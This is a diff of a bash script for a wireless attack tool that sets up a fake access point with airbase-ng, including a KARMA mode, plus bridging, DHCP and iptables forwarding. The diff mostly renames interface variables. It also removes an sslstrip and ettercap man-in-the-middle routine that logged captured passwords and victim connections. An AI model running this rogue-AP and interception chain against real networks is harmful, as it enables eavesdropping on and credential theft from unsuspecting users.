@@ -24,7 +24,7 @@ DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
 # yeah this is that help menu
 if [[ -n $1 ]]; then
 	if [[ $1 == '-h' || $1 == '--help' ]]; then
-		echo -e "Useage: n4p [mode] [option] [option]
+		echo -e "Useage: n4p [mode] [option] [option [eth0 wlan0]]
 		where: mode
 			-f 				fast setup
 			--fast			fast setup
@@ -34,8 +34,7 @@ if [[ -n $1 ]]; then
 			-d 				DHCPD enabled
 			--dhcpd 		DHCPD enabled
 		Where: option 2
-			-s 				Use SSL Strip
-			--sslstrip 		Use SSL Strip"
+			-i 				Use interfaces"
 		exit 0
 	# If any fast options were used predefine there variables now
 	elif [[ $1 == '-f' || $1 == '--fast' ]]; then
@@ -51,8 +50,8 @@ if [[ -n $1 ]]; then
 			exit 0
 		fi
 		
-		if [[ $3 == '-s' || $3 == '--sslstrip' ]]; then
-			FAST_SSLSTRIP="True"
+		if [[ $3 == '-i' ]]; then
+			IFACE0=$4; IFACE1=$5
 		elif [[ -n $3 ]]; then
 			echo "Invalid option see --help"
 			exit 0
@@ -69,17 +68,16 @@ fi
 depends()
 {
 	IPT="/sbin/iptables"
-	LAN2="eth1"
-	LAN="eth0"
-	WLAN="wlan0"
+	if [[ -z $IFACE0 ]]; then IFACE0="eth0"; fi 
+	if [[ -z $IFACE1 ]]; then IFACE1="wlan0"; fi
 	AP="at0"
 	MON="wlan0mon"
 	VPN="tun0"
 	VPNI="tap+"
-	AP_GATEWAY="10.0.0.254"
-	AP_SUBNET="255.255.255.0"
-	AP_IP="10.0.0.0"
-	AP_BROADCAST="10.0.0.255"
+	AP_GATEWAY=$(grep routers dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
+	AP_SUBNET=$(grep netmask dhcpd.conf | awk -Fnetmask '{print $2}' | cut -d '{' -f 1 | cut -d ' ' -f 2 | cut -d ' ' -f 1)
+	AP_IP=$(grep netmask dhcpd.conf | awk -Fnetmask '{print $1}' | cut -d ' ' -f 1)
+	AP_BROADCAST=$(grep broadcast-address dhcpd.conf | awk -Fbroadcast-address '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
 	# Text color variables
 	TXT_UND=$(tput sgr 0 1)          # Underline
 	TXT_BLD=$(tput bold)             # Bold
@@ -176,10 +174,10 @@ settings()
 		echo "${BLD_ORA}***************************************************************************************${TXT_RST}"
 		echo "$INFO Press Enter for defaults"
 		read -p "$QUES What is your Internet or default interface? [eth0]: " LAN
-		if [[ -z $LAN ]]; then LAN="eth0"; fi
+		if [[ -z $IFACE0 ]]; then IFACE0="eth0"; fi
 
 		read -p "$QUES What is your default Wireless interface? [wlan0]: " WLAN
-		if [[ -z $WLAN ]]; then WLAN="wlan0"; fi
+		if [[ -z $IFACE1 ]]; then IFACE1="wlan0"; fi
 
 		read -p "$QUES AP configuration Press enter for defaults or 1 for custom AP attributes: " ATTRIBUTES
 		if [[ $ATTRIBUTES != 1 ]]; then
@@ -207,19 +205,19 @@ settings()
 			if (( ($PPS < 100) )); then PPS="100"; fi
 		fi
 	else
-		if [[ -z $LAN ]]; then LAN="eth0"; fi
+		if [[ -z $IFACE0 ]]; then IFACE0="eth0"; fi
 		
-		if [[ -z $WLAN ]]; then WLAN="wlan0"; fi
+		if [[ -z $IFACE1 ]]; then IFACE1="wlan0"; fi
 
-		if [[ -e /etc/init.d/net.$WLAN ]]; then
-			get_RCstatus "$WLAN"
+		if [[ -e /etc/init.d/net.$IFACE1 ]]; then
+			get_RCstatus "$IFACE1"
 			if [[ $STATUS == 'started' ]]; then
-				/etc/init.d/net.$WLAN stop
+				/etc/init.d/net.$IFACE1 stop
 			fi
 		fi
-		get_state $WLAN
-		[[ $STATE != 'DOWN' ]] && ip link set $WLAN down
-		iwconfig $WLAN mode managed #Force managed mode upon wlan because there is a glitch that can block airmon from bringing the interface up if not previously done
+		get_state $IFACE1
+		[[ $STATE != 'DOWN' ]] && ip link set $IFACE1 down
+		iwconfig $IFACE1 mode managed #Force managed mode upon wlan because there is a glitch that can block airmon from bringing the interface up if not previously done
 		ESSID="Pentoo"
 		CHAN="1"
 		BEACON="100"
@@ -269,9 +267,9 @@ rebuild_network()
 	+==================================+${TXT_RST}"
 	read -p "$QUES Option: " MENU_REBUILD_NETWORK
 	if [[ $MENU_REBUILD_NETWORK == 1 ]]; then
-		local DEVICE=$LAN 
+		local DEVICE=$IFACE0 
 	elif [[ $MENU_REBUILD_NETWORK == 2 ]]; then
-		local DEVICE=$WLAN	
+		local DEVICE=$IFACE1	
 	else 
 		echo "$WARN Invalid option"
 		rebuild_network
@@ -293,21 +291,20 @@ trap killemAll INT HUP;
 ##################################################################
 startairbase()
 {
-	get_state "$WLAN"
+	get_state "$IFACE1"
 	while [[ $STATE != 'DOWN' ]]; do 
-		ip link set "$WLAN" down
+		ip link set "$IFACE1" down
 	done
 
 	step "$INFO Airmon-zc comming up"
 	action airmon-zc check kill
-	action airmon-zc start $WLAN
+	action airmon-zc start $IFACE1
 	next
 
 	if [[ $MENUCHOICE == 2 ]]; then
 		step "$INFO STARTING SERVICE: AIRBASE-NG" #-Z -a -0
 		action airbase-ng -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -v $MON > $sessionfolder/logs/airbase-ng.log &
 		sleep 1.5 ## future put this and the next line in a more comprehensive loop
-		#action cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
 		next
 	elif [[ $MENUCHOICE == 1 ]]; then # used elif instead of just else for more comprehensive structure so users may modify easier.
 		step "$INFO STARTING SERVICE: KARMA AIRBASE-NG"
@@ -348,7 +345,6 @@ startairbase()
 	action route -n
 	next
 	AIRBASE="On"
-	xterm -hold -bg black -fg blue -T "Airbase logs" -geometry 90x20 -e tail -f "$sessionfolder/logs/airbase-ng.log" &>/dev/null &
 }
 #################################################################
 #################Verify our DHCP and bridge needs################
@@ -426,20 +422,20 @@ fbridge()
 				read -p "$QUES Create the arbitrary name of your bridge, e.g. br0: " BRIDGE
 				if [[ -z $BRIDGE ]]; then BRIDGE=br0; fi
 
-				echo -e "$INFO We need to setup the interfaces you are going to use with $BRIDGE \n e.g. $LAN and $AP, here are your possible choices"
+				echo -e "$INFO We need to setup the interfaces you are going to use with $BRIDGE \n e.g. $IFACE0 and $AP, here are your possible choices"
 				echo "${BLD_ORA}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${TXT_RST}"
 				ip addr
 				echo "{BLD_ORA}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${TXT_RST}"
 
 				read -p "$QUES Please tell me the first interface to use: " RESP_BR_1
-				if [[ -z $RESP_BR_1 ]]; then RESP_BR_1=$LAN; fi
+				if [[ -z $RESP_BR_1 ]]; then RESP_BR_1=$IFACE0; fi
 				
 				read -p "$QUES Please tell me the second interface to use: " RESP_BR_2
 				if [[ -z $RESP_BR_2 ]]; then # Run default check to verify what our default interface should be encase the user forgot to set this properly.
 					if [[ $AIRBASE == 'On' ]]; then
 						RESP_BR_2=$AP
 					#else # Enable this option for Hostapd
-					#	RESP_BR_2=$WLAN 
+					#	RESP_BR_2=$IFACE1 
 					fi
 				fi
 				BRIDGED="True"
@@ -452,11 +448,11 @@ fbridge()
 		fi
 	elif [[ $BRIDGED == 'True' ]]; then # If we are here then $FAST -f was enabled with -b
 		BRIDGE=br0
-		RESP_BR_1=$LAN
+		RESP_BR_1=$IFACE0
 		if [[ -n $FAST_AIRBASE ]]; then
 			RESP_BR_2=$AP
 		#elif [[ -n $FAST_HOSTAPD ]]; then # Users may run hostapd instead on their own just by running it and changing the FAST variable on line 42 to $FAST_HOSTAPD
-		#	RESP_BR_2=$WLAN
+		#	RESP_BR_2=$IFACE1
 		fi
 		openrc_bridge
 	fi
@@ -469,46 +465,27 @@ dhcp()
 			if [[ -e /etc/init.d/net.$AP ]]; then
 				get_RCstatus "$AP"
 				if [[ STATUS == 'started' ]]; then
-					echo ""
-					step "$INFO Restarting interface $AP up"
-					action /etc/init.d/net.$AP restart
-					next
+					/etc/init.d/net.$AP restart
+					sleep .5
+					/etc/init.d/dhcpd restart
 				fi
 			else
-				echo ""
-				step "$INFO Bringing interface $AP up"
 				if [[ ! -e /etc/init.d/net.$AP ]]; then
-					action ln -s /etc/init.d/net.lo /etc/init.d/net.$AP
+					ln -s /etc/init.d/net.lo /etc/init.d/net.$AP
 				fi
-				action /etc/init.d/net.$AP start
-				next
+				/etc/init.d/net.$AP start
+				sleep .5
+				/etc/init.d/dhcpd restart
 			fi
 		else
-			echo ""
-			step "$INFO Starting Bridge"
-			action /etc/init.d/net.$BRIDGE start
-			next
+			/etc/init.d/net.$BRIDGE start
 		fi
 	else # We apparently don't have the proper configuration file. Make the changes and action again
 		find * -wholename $DIR/dhcpd.conf -exec cat {} >> /etc/dhcp/dhcpd.conf \;
 		dhcp
 	fi
 }
-##################################################################
-####################Launch External Services######################
-##################################################################
-mitm()
-{
-	echo ""
-	step "$INFO Launching sslstrip"
-	action sslstrip -p -k -f lock.ico -w $sessionfolder/logs/ssl.log &>/dev/null
-	#action xterm -hold -e "tail -f /var/log/messages | grep -i N4P_Victim:"
-	next
-	echo ""
-	step "$INFO Launching ettercap"
-	action xterm -hold -e "ettercap -T -i $AP -w $sessionfolder/logs/recovered_passwords.pcap -L $sessionfolder/logs/all_traffic.log"
-	next	
-}
+
 ##################################################################
 ######################Build the firewall##########################
 ##################################################################
@@ -565,8 +542,8 @@ fw_redundant()
 
 	## permit local network
 	step "$INFO  Permit local network"
-	action $IPT -A INPUT -i $LAN -j ACCEPT
-	action $IPT -A OUTPUT -o $LAN -j ACCEPT
+	action $IPT -A INPUT -i $IFACE0 -j ACCEPT
+	action $IPT -A OUTPUT -o $IFACE0 -j ACCEPT
 	next
 
 	## DHCP
@@ -576,10 +553,10 @@ fw_redundant()
 
 	## Allow Samba
 	step "$INFO Configuring Samba"
-	action $IPT -A INPUT -i $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
-	action $IPT -A INPUT -i $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
-	action $IPT -A OUTPUT -o $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
-	action $IPT -A OUTPUT -o $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
+	action $IPT -A INPUT -i $IFACE0 -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
+	action $IPT -A INPUT -i $IFACE0 -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
+	action $IPT -A OUTPUT -o $IFACE0 -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
+	action $IPT -A OUTPUT -o $IFACE0 -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
 	next
 	fw_pre_services
 }
@@ -641,8 +618,8 @@ fw_closure()
 {
 	## drop everything else arriving from WAN on local interfaces
 	step "$INFO Drop everything else"
-	action $IPT -A INPUT -i $LAN -j LOG
-	action $IPT -A INPUT -i $LAN -j DROP
+	action $IPT -A INPUT -i $IFACE0 -j LOG
+	action $IPT -A INPUT -i $IFACE0 -j DROP
 	next
 	#
 	# Save settings
@@ -660,53 +637,17 @@ fw_closure()
 	action $IPT -L -v
 	next
 }
-fw_ssl()
-{
-	if [[ -n $FAST_SSLSTRIP ]]; then
-		echo ""
-		step "$INFO Fast mode sslstrip"
-		action $IPT -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
-		#action $IPT -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
-		mitm
-		next
-	else	
-		read -p "$INFO Are we using sslstrip? (y/n) " SSLSTRIP
-		if [[ $SSLSTRIP == [yY] ]]; then
-			FAST_SSLSTRIP=Y; fw_ssl
-		elif [[ $SSLSTRIP != [nN] ]]; then
-			echo "$WARN Bad input"; fw_ssl
-		fi
-	fi
-}
+
 fw_up()
 { 
 	fw_redundant
-
-	if [[ $FAST != 'True' ]]; then
-		echo "$INFO It's time for specialty hacking configurations"
-		echo -e "These settings are not default as they may break daily activity.\nDaily rules will automagically be rebuilt when you're done hacking all the things"
-		read -p "Are we launching attacks with this AP? y/n?" ATTACK
-		if [[ $ATTACK == [yY] ]]; then
-			fw_ssl
-		elif [[ $ATTACK != [nN] ]]; then
-			echo "$WARN Bad input"; fw_up
-		fi
-	fi	
-	#Pass everything through tor 'uncomment the folllowing line if you want all outbound sent through tor'
-	#iptables -A PREROUTING -i $LAN -p tcp -j DNAT --to-destination 127.0.0.1:9050
-
-	#log all connection activity
-	step "$INFO Set logging"
-	$IPT -A INPUT -i $AP -p tcp -m state --state new -j LOG --log-prefix "N4P_Victim: "
-	next
-
 	if [[ $BRIDGED != 'True' ]]; then
-		step "$INFO Allowing wirless for airbase, routing $AP through $LAN be sure airbase was configured for $AP and $LAN as the output otherwise adjust these settings"
-		action $IPT -t nat -A POSTROUTING -o $LAN -j MASQUERADE
-		action $IPT -A FORWARD -i $AP -o $LAN -j ACCEPT
-		action $IPT -A FORWARD -i $LAN -o $AP -j ACCEPT
-		#action $IPT -A FORWARD -i $WLAN -o $LAN -j ACCEPT
-		#action $IPT -A FORWARD -i $LAN -o $WLAN -j ACCEPT
+		step "$INFO Allowing wirless for airbase, routing $AP through $IFACE0 be sure airbase was configured for $AP and $IFACE0 as the output otherwise adjust these settings"
+		action $IPT -t nat -A POSTROUTING -o $IFACE0 -j MASQUERADE
+		action $IPT -A FORWARD -i $AP -o $IFACE0 -j ACCEPT
+		action $IPT -A FORWARD -i $IFACE0 -o $AP -j ACCEPT
+		#action $IPT -A FORWARD -i $IFACE1 -o $IFACE0 -j ACCEPT
+		#action $IPT -A FORWARD -i $IFACE0 -o $IFACE1 -j ACCEPT
 		next
 	fi
 	fw_closure
